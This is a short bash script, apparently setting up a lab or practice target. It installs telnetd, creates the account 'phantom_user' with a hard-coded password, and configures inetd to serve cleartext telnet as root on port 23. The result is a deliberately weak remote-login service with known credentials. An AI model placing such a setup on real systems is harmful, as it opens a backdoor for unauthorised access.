#!/bin/bash

apt update || true
apt install -y telnetd inetutils-inetd
id phantom_user >/dev/null 2>&1 || useradd -m -s /bin/bash phantom_user
echo "phantom_user:wired_ghost" | chpasswd
sed -i '/telnet/d' /etc/inetd.conf
echo "telnet stream tcp nowait root /usr/sbin/telnetd telnetd" >> /etc/inetd.conf
service inetutils-inetd restart
echo "[*] telnetd siap di port 23"
